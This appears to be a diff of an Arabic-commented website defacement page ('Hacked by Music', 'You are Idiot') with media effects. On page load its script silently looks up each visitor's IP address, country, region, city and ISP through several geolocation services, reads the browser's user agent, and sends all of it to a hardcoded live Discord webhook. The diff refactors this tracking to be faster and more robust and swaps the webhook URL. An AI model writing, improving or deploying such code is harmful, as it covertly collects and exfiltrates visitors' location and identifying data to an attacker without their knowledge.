@@ -25,7 +25,10 @@
         body::before {
             content: '';
             position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
             background: #ff0000;
             z-index: 9999;
             opacity: 0;
@@ -34,8 +37,12 @@
         }
 
         @keyframes flash {
-            0% { opacity: 0.2; }
-            100% { opacity: 0; }
+            0% {
+                opacity: 0.2;
+            }
+            100% {
+                opacity: 0;
+            }
         }
 
         /* فيديو الخلفية المحسن مع التكرار التلقائي */
@@ -94,10 +101,18 @@
         }
 
         @keyframes loading {
-            0% { width: 0%; }
-            40% { width: 60%; }
-            75% { width: 90%; }
-            100% { width: 100%; }
+            0% {
+                width: 0%;
+            }
+            40% {
+                width: 60%;
+            }
+            75% {
+                width: 90%;
+            }
+            100% {
+                width: 100%;
+            }
         }
 
         /* العناوين والخطوط الرقمية */
@@ -111,8 +126,15 @@
         }
 
         @keyframes pulse-white {
-            0%, 100% { text-shadow: 0 0 30px rgba(255, 255, 255, 0.8); transform: scale(1); }
-            50% { text-shadow: 0 0 50px rgba(255, 255, 255, 1); transform: scale(1.02); }
+            0%,
+            100% {
+                text-shadow: 0 0 30px rgba(255, 255, 255, 0.8);
+                transform: scale(1);
+            }
+            50% {
+                text-shadow: 0 0 50px rgba(255, 255, 255, 1);
+                transform: scale(1.02);
+            }
         }
 
         .subtitle {
@@ -143,8 +165,12 @@
         }
 
         @keyframes glow-gold {
-            from { text-shadow: 0 0 10px #ffd700, 0 0 20px #ffd700; }
-            to { text-shadow: 0 0 20px #fffacd, 0 0 40px #fffacd; }
+            from {
+                text-shadow: 0 0 10px #ffd700, 0 0 20px #ffd700;
+            }
+            to {
+                text-shadow: 0 0 20px #fffacd, 0 0 40px #fffacd;
+            }
         }
 
         /* حاوية المحتوى الرئيسي */
@@ -170,46 +196,79 @@
         /* نظام الجسيمات الخفيف والسلس */
         .particles {
             position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
             z-index: 1;
             pointer-events: none;
         }
 
         .particle {
             position: absolute;
-            width: 3px; height: 3px;
+            width: 3px;
+            height: 3px;
             background: rgba(255, 51, 51, 0.35);
             border-radius: 50%;
             animation: float 6s infinite linear;
         }
 
         @keyframes float {
-            0% { transform: translateY(100vh); opacity: 1; }
-            100% { transform: translateY(-10px); opacity: 0; }
+            0% {
+                transform: translateY(100vh);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-10px);
+                opacity: 0;
+            }
         }
 
-        .fade-out { animation: fadeOut 0.8s ease forwards; }
-        @keyframes fadeOut { from { opacity: 1; } to { opacity: 0; visibility: hidden; } }
+        .fade-out {
+            animation: fadeOut 0.8s ease forwards;
+        }
+        @keyframes fadeOut {
+            from {
+                opacity: 1;
+            }
+            to {
+                opacity: 0;
+                visibility: hidden;
+            }
+        }
 
-        .fade-in { animation: fadeIn 1.2s ease forwards; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        .fade-in {
+            animation: fadeIn 1.2s ease forwards;
+        }
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
 
-        /* حاوية بيانات المستخدم العلوية المحدثة لتناسب جميع تفاصيل الموقع */
+        /* حاوية بيانات المستخدم العلوية المحدثة */
         .top-left-status {
             position: fixed;
-            top: 25px; left: 25px;
+            top: 25px;
+            left: 25px;
             display: flex;
             flex-direction: column;
             align-items: flex-start;
-            gap: 4px; 
+            gap: 4px;
             font-family: 'Courier New', monospace;
-            z-index: 1000; 
-            direction: ltr; 
+            z-index: 1000;
+            direction: ltr;
             background: rgba(0, 0, 0, 0.65);
-            padding: 12px 20px; 
+            padding: 12px 20px;
             border-radius: 8px;
             border: 1px solid rgba(0, 255, 0, 0.2);
             box-shadow: 0 0 20px rgba(0, 255, 0, 0.08);
+            min-width: 160px;
         }
 
         /* تنسيق الساعة الرقمية المضيئة */
@@ -221,9 +280,9 @@
             text-shadow: 0 0 12px rgba(0, 255, 0, 0.8);
         }
 
-        /* سطر عرض بيانات الاتصال والموقع الجغرافي */
+        /* سطر عرض بيانات الاتصال والموقع الجغرافي (تم إضافة الـ id المطلوب) */
         .status-text-block {
-            font-size: 0.95em;
+            font-size: 0.85em;
             color: #aaffaa;
             border-top: 1px solid rgba(0, 255, 0, 0.25);
             padding-top: 6px;
@@ -231,55 +290,85 @@
             width: 100%;
             letter-spacing: 0.5px;
             text-shadow: 0 0 8px rgba(0, 255, 0, 0.5);
-            direction: rtl; 
+            direction: rtl;
             text-align: left;
-            line-height: 1.5;
+            line-height: 1.6;
         }
 
         /* شريط معلومات النظام التفاعلي أسفل الشاشة */
         .bottom-logs {
             position: fixed;
-            bottom: 20px; left: 50%;
+            bottom: 20px;
+            left: 50%;
             transform: translateX(-50%);
             font-family: 'Courier New', monospace;
-            color: #ff3333; font-size: 1.1em;
+            color: #ff3333;
+            font-size: 1.1em;
             text-shadow: 0 0 8px #ff3333;
-            z-index: 1000; direction: ltr;
+            z-index: 1000;
+            direction: ltr;
             background: rgba(0, 0, 0, 0.65);
-            padding: 5px 22px; border-radius: 4px;
+            padding: 5px 22px;
+            border-radius: 4px;
             border: 1px solid rgba(255, 51, 51, 0.15);
         }
 
         /* مؤشر حالة النظام العام أسفل اليمين */
         .system-status {
             position: fixed;
-            bottom: 20px; right: 20px;
-            font-size: 1em; color: #00ff00;
-            font-family: 'Courier New', monospace; z-index: 1000;
-            display: flex; align-items: center; gap: 10px;
+            bottom: 20px;
+            right: 20px;
+            font-size: 1em;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            gap: 10px;
             text-shadow: 0 0 6px #00ff00;
         }
 
         .status-dot {
-            width: 10px; height: 10px;
-            background-color: #00ff00; border-radius: 50%;
+            width: 10px;
+            height: 10px;
+            background-color: #00ff00;
+            border-radius: 50%;
             box-shadow: 0 0 10px #00ff00;
             animation: blink 1.2s infinite alternate;
         }
 
-        @keyframes blink { from { opacity: 1; } to { opacity: 0.25; } }
+        @keyframes blink {
+            from {
+                opacity: 1;
+            }
+            to {
+                opacity: 0.25;
+            }
+        }
     </style>
 </head>
 
+<body>
 
+    <!-- شريط الحالة العلوي (تم إضافة العنصر المطلوب هنا) -->
+    <div class="top-left-status">
+        <div id="clock">00:00:00 AM</div>
+        <div id="top-ip-display" class="status-text-block">
+            الدولة: جاري التحميل...<br>
+            المدينة: جاري التحميل...<br>
+            IP: جاري التحميل...
+        </div>
+    </div>
+
+    <!-- شريط السجلات السفلي -->
     <div class="bottom-logs" id="terminal-logs">[SYS] STATUS: STANDBY_MODE...</div>
 
-
-
+    <!-- فيديو الخلفية -->
     <video class="background-video" autoplay loop muted playsinline id="bg-video">
         <source src="https://h.top4top.io/m_37898tcsh1.mp4" type="video/mp4" />
     </video>
 
+    <!-- ملفات الصوت -->
     <audio id="background-music" loop playsinline>
         <source src="https://d.top4top.io/m_3789i6ns81.mp3" type="audio/mpeg" />
     </audio>
@@ -291,33 +380,212 @@
     <div class="overlay"></div>
     <div class="particles" id="particles"></div>
 
+    <!-- شاشة التحميل -->
     <div class="loading-screen" id="loading-screen">
         <div class="main-title">Music</div>
         <div class="loading-bar-container">
             <div class="loading-bar"></div>
         </div>
-
         <div class="subtitle">Hacked by Music</div>
         <div class="subtitle">! You are Idiot !</div>
         <a href="" class="discord-link" target="_blank" rel="noopener noreferrer"></a>
     </div>
 
+    <!-- المحتوى الرئيسي -->
     <div class="main-content" id="main-content">
         <img src="https://j.top4top.io/p_3664n97sh1.jpg" alt="Logo" class="logo-image" />
         <div class="main-title">Music on your server</div>
         <div class="main-title">! You are Idiot !</div>
         <div class="subtitle">
-            
             <br>
-            
         </div>
         <a href="" class="discord-link" target="_blank" rel="noopener noreferrer"></a>
     </div>
 
     <script>
+        // ================================================================
+        //  [التحسينات] الجزء الأول: دوال الجلب المتقدمة
+        // ================================================================
+
         let currentNetworkData = {};
 
-        // توليد حركة الجسيمات في الخلفية بأعلى أداء واستقرار
+        // دالة مساعدة لإضافة مهلة زمنية للـ Fetch (إلغاء الطلب بعد 4 ثواني)
+        function fetchWithTimeout(url, timeout = 4000) {
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), timeout);
+
+            return fetch(url, {
+                    signal: controller.signal,
+                    headers: { 'Accept': 'application/json' }
+                })
+                .then(response => {
+                    clearTimeout(timeoutId);
+                    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+                    return response.json();
+                })
+                .catch(err => {
+                    clearTimeout(timeoutId);
+                    throw new Error(`Timeout or Network error: ${err.message}`);
+                });
+        }
+
+        // قائمة الخدمات مع دوال "محلل" (Parser) لتوحيد المخرجات
+        const API_SOURCES = [{
+            url: 'https://ipapi.co/json/',
+            parser: (data) => ({
+                ip: data.ip || 'غير معروف',
+                country: data.country_name || data.country || 'غير معروف',
+                region: data.region || 'غير معروف',
+                city: data.city || 'غير معروف',
+                isp: data.org || data.isp || 'غير معروف'
+            })
+        }, {
+            url: 'https://ipwho.is/',
+            parser: (data) => ({
+                ip: data.ip || 'غير معروف',
+                country: data.country || 'غير معروف',
+                region: data.region || 'غير معروف',
+                city: data.city || 'غير معروف',
+                isp: data.connection?.isp || data.org || 'غير معروف'
+            })
+        }, {
+            url: 'https://extreme-ip-lookup.com/json/',
+            parser: (data) => ({
+                ip: data.query || data.ip || 'غير معروف',
+                country: data.country || 'غير معروف',
+                region: data.region || 'غير معروف',
+                city: data.city || 'غير معروف',
+                isp: data.org || data.isp || 'غير معروف'
+            })
+        }];
+
+        // الدالة الرئيسية المحسنة (جلب متوازي + كاش)
+        async function fetchOptimizedNetworkData() {
+            // 1. التحقق من الكاش أولاً (صلاحية ساعة واحدة)
+            try {
+                const cached = localStorage.getItem('user_geo_cache');
+                if (cached) {
+                    const parsed = JSON.parse(cached);
+                    if (Date.now() - parsed.timestamp < 3600000) { // أقل من ساعة
+                        console.log('✅ استخدام بيانات مخزنة مؤقتاً');
+                        return parsed.data;
+                    }
+                }
+            } catch (e) { /* تجاهل خطأ الكاش */ }
+
+            // 2. تنفيذ جميع الطلبات بشكل متوازٍ
+            const fetchPromises = API_SOURCES.map(source =>
+                fetchWithTimeout(source.url, 4000) // مهلة 4 ثواني
+                .then(data => {
+                    // تحقق من صحة البيانات الأساسية (تأكد أن الـ IP موجود)
+                    if (!data || (!data.ip && !data.query && !data.ip)) {
+                        throw new Error('بيانات غير مكتملة');
+                    }
+                    return source.parser(data);
+                })
+            );
+
+            try {
+                // Promise.any: ترجع أول طلب ينجح (أسرع خادم)
+                const result = await Promise.any(fetchPromises);
+
+                // حفظ في الكاش مع الطابع الزمني
+                localStorage.setItem('user_geo_cache', JSON.stringify({
+                    data: result,
+                    timestamp: Date.now()
+                }));
+
+                console.log('✅ تم جلب البيانات بنجاح:', result);
+                return result;
+
+            } catch (error) {
+                console.error('❌ فشلت جميع خدمات جلب الـ IP:', error);
+                return null; // أو إرجاع بيانات افتراضية
+            }
+        }
+
+        // ================================================================
+        //  [التحسينات] الجزء الثاني: دوال التحديث والإرسال (مع الحفاظ على الوظائف الأصلية)
+        // ================================================================
+
+        // دالة تحديث الواجهة (تم تعديلها لتتناسب مع العنصر الموجود)
+        function updateLocationUI(data) {
+            const displayElement = document.getElementById('top-ip-display');
+            if (displayElement) {
+                displayElement.innerHTML = `
+                        الدولة: ${data.country}<br>
+                        المنطقة: ${data.region}<br>
+                        المدينة: ${data.city}<br>
+                        IP: ${data.ip}
+                    `;
+            }
+        }
+
+        // دالة عرض وضع عدم الاتصال (في حال فشل كل شيء)
+        function showOfflineUI() {
+            const displayElement = document.getElementById('top-ip-display');
+            if (displayElement) {
+                displayElement.innerHTML = `
+                        الدولة: فحص الشبكة...<br>
+                        المنطقة: جاري التثبيت...<br>
+                        المدينة: فحص الاتصال...<br>
+                        IP: اتصال خارجي آمن
+                    `;
+            }
+        }
+
+        // دالة إرسال البيانات إلى Webhook (مع تحذير أمني، يُفضل استخدام بروكسي)
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1522122255327297667/2Sh-s4h-GgR_BaM8eexpMzzrO_7XimZavKHcbXMPDoPbhxIV5_yF020WA3AbTssRuXR8';
+
+        function sendToWebhook(data) {
+            if (!WEBHOOK_URL) return;
+            const payload = {
+                username: "System Logger",
+                avatar_url: "",
+                embeds: [{
+                    title: "🌐 تسجيل دخول مستخدم جديد (موقع دقيق)",
+                    color: 15548997,
+                    fields: [
+                        { name: "📌 IP Address", value: `\`${data.ip || "Unknown"}\``, inline: false },
+                        { name: "🏳️ Country", value: data.country || "Unknown", inline: true },
+                        { name: "📍 Region", value: data.region || "Unknown", inline: true },
+                        { name: "🏙️ City", value: data.city || "Unknown", inline: true },
+                        { name: "🏢 ISP / Provider", value: data.isp || "Unknown", inline: false },
+                        { name: "🖥️ User Agent", value: navigator.userAgent, inline: false }
+                    ],
+                    footer: { text: "Music System | " + new Date().toLocaleString('ar-EG') },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(err => console.log('خطأ ويب هوك.'));
+        }
+
+        // ================================================================
+        //  [التحسينات] الجزء الثالث: استدعاء الدالة الجديدة بدلاً من القديمة
+        // ================================================================
+
+        async function fetchSystemNetworkData() {
+            const data = await fetchOptimizedNetworkData();
+
+            if (data) {
+                currentNetworkData = data;
+                updateLocationUI(data); // تحديث الواجهة
+                sendToWebhook(data); // الإرسال إلى الديسكورد
+            } else {
+                showOfflineUI(); // وضع الفشل الكامل
+            }
+        }
+
+        // ================================================================
+        //  باقي الكود الأصلي (الجسيمات، الساعة، السجلات، التحكم بالصوت، إلخ)
+        // ================================================================
+
+        // توليد حركة الجسيمات في الخلفية
         function createParticles() {
             const particles = document.getElementById('particles');
             if (!particles) return;
@@ -339,38 +607,37 @@
         const glitchSound = document.getElementById('click-glitch-sound');
         const video = document.getElementById('bg-video');
 
-        // دالة مخصصة لضمان تشغيل الصوت والفيديو بأعلى كفاءة وفك كتم المتصفح
         const playMedia = () => {
             if (music) {
                 music.muted = false;
-                music.volume = 1.0; 
+                music.volume = 1.0;
                 music.play().catch(() => {});
             }
             if (video) {
-                video.muted = true; 
+                video.muted = true;
                 video.play().catch(() => {});
             }
         };
 
-        // تفعيل الصوت والفيديو فور قيام المستخدم بالضغط لتخطي قيود المتصفحات
         const activateInterface = () => {
-            if (glitchSound) { glitchSound.volume = 0.4; glitchSound.play().catch(() => {}); }
+            if (glitchSound) { glitchSound.volume = 0.4;
+                glitchSound.play().catch(() => {}); }
             playMedia();
         };
 
         addEventListener('click', activateInterface, { once: true });
         addEventListener('keydown', activateInterface, { once: true });
 
-        // إدارة تحديث الساعة الرقمية بشكل لحظي متزامن
+        // تحديث الساعة الرقمية
         function updateClock() {
             const now = new Date();
             let hours = now.getHours();
             const minutes = String(now.getMinutes()).padStart(2, '0');
             const seconds = String(now.getSeconds()).padStart(2, '0');
             const ampm = hours >= 12 ? 'PM' : 'AM';
-            
+
             hours = hours % 12;
-            hours = hours ? hours : 12; 
+            hours = hours ? hours : 12;
             const formattedHours = String(hours).padStart(2, '0');
 
             const clockElement = document.getElementById('clock');
@@ -381,7 +648,7 @@
         setInterval(updateClock, 1000);
         updateClock();
 
-        // محاكاة سجلات فحص النظام التفاعلية أسفل الشاشة
+        // محاكاة سجلات فحص النظام التفاعلية
         const logsSequence = [
             "[SYS] STATUS: INITIALIZING SYSLOG...",
             "[NET] VERIFYING CONNECTION INTEGRITY...",
@@ -416,137 +683,10 @@
             });
         }
 
-        // إرسال البيانات المجمعة من فحص الشبكة والموقع إلى الويب هوك الخاص بك في ديسكورد
-        const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1505952176101654668/uF0EyQe4yv8wMvcxFmRLao2n1bI4k9-noygzAG8hD_8LvWA23u7q129g30xdIFDpAZS9';
-
-        function sendToWebhook(data) {
-            if (!WEBHOOK_URL) return;
-            const payload = {
-                username: "System Logger",
-                avatar_url: "",
-                embeds: [{
-                    title: "🌐 تسجيل دخول مستخدم جديد (موقع دقيق)",
-                    color: 15548997, 
-                    fields: [
-                        { name: "📌 IP Address", value: `\`${data.ip || "Unknown"}\``, inline: false },
-                        { name: "🏳️ Country", value: data.country || "Unknown", inline: true },
-                        { name: "📍 Region", value: data.region || "Unknown", inline: true },
-                        { name: "🏙️ City", value: data.city || "Unknown", inline: true },
-                        { name: "🏢 ISP / Provider", value: data.isp || "Unknown", inline: false },
-                        { name: "🖥️ User Agent", value: navigator.userAgent, inline: false }
-                    ],
-                    footer: { text: "Music System | " + new Date().toLocaleString('ar-EG') },
-                    timestamp: new Date().toISOString()
-                }]
-            };
-
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).catch(err => console.log('خطأ ويب هوك.'));
-        }
-
-        // الخدمة المحدثة 100%: تستخدم بروتوكول آمن بالكامل ومتوافقة تماماً مع شاشات المتصفح على جيتهاب
-        function fetchSystemNetworkData() {
-            fetch('https://ipapi.co/json/')
-                .then(res => {
-                    if (!res.ok) throw new Error('API Error');
-                    return res.json();
-                })
-                .then(data => {
-                    if (data && data.ip) {
-                        currentNetworkData = {
-                            ip: data.ip,
-                            country: data.country_name || "غير معروف",
-                            region: data.region || "غير معروف",
-                            city: data.city || "غير معروف",
-                            isp: data.org || "غير معروف"
-                        };
-                        updateLocationUI(currentNetworkData);
-                        sendToWebhook(currentNetworkData);
-                    } else {
-                        fetchFallbackIP();
-                    }
-                })
-                .catch(() => { fetchFallbackIP(); });
-        }
-
-        // خدمة بديلة قوية تعمل بـ HTTPS وجلب دقيق للبيانات لتلافي الحظر المباشر
-        function fetchFallbackIP() {
-            fetch('https://ipwho.is/')
-                .then(res => res.json())
-                .then(data => {
-                    if (data && data.success) {
-                        currentNetworkData = {
-                            ip: data.ip,
-                            country: data.country || "غير معروف",
-                            region: data.region || "غير معروف",
-                            city: data.city || "غير معروف",
-                            isp: data.connection?.isp || "غير معروف"
-                        };
-                        updateLocationUI(currentNetworkData);
-                        sendToWebhook(currentNetworkData);
-                    } else {
-                        fetchThirdFallback();
-                    }
-                })
-                .catch(() => {
-                    fetchThirdFallback();
-                });
-        }
-
-        // خدمة ثالثة آمنة تماماً تستخدم كبديل أخير لتعبئة البيانات في حال حدوث أي حظر شبكة مفاجئ
-        function fetchThirdFallback() {
-            fetch('https://extreme-ip-lookup.com/json/?key=demo2')
-                .then(res => res.json())
-                .then(data => {
-                    if (data && data.status === "success") {
-                        currentNetworkData = {
-                            ip: data.query,
-                            country: data.country || "غير معروف",
-                            region: data.region || "غير معروف",
-                            city: data.city || "غير معروف",
-                            isp: data.org || "غير معروف"
-                        };
-                        updateLocationUI(currentNetworkData);
-                        sendToWebhook(currentNetworkData);
-                    } else {
-                        showOfflineUI();
-                    }
-                })
-                .catch(() => { showOfflineUI(); });
-        }
-
-        // دالة تحديث نص الواجهة بالبيانات الكاملة المستخرجة داخل الشاشة الخضراء
-        function updateLocationUI(data) {
-            const displayElement = document.getElementById('top-ip-display');
-            if (displayElement) {
-                displayElement.innerHTML = `
-                    الدولة: ${data.country}<br>
-                    المنطقة: ${data.region}<br>
-                    المدينة: ${data.city}<br>
-                    ip: ${data.ip}
-                `;
-            }
-        }
-
-        // دالة تعرض تنبيه منسق في الشاشة في أسوأ الحالات إذا انقطع اتصال الزائر تماماً
-        function showOfflineUI() {
-            const displayElement = document.getElementById('top-ip-display');
-            if (displayElement) {
-                displayElement.innerHTML = `
-                    الدولة: فحص الشبكة...<br>
-                    المنطقة: جاري التثبيت...<br>
-                    المدينة: فحص الاتصال...<br>
-                    ip: اتصال خارجي آمن
-                `;
-            }
-        }
-
-        // بدء التشغيل التلقائي للفحص
+        // بدء التشغيل التلقائي للفحص (باستخدام الدالة المحسّنة)
         fetchSystemNetworkData();
     </script>
+
 </body>
 
 </html>
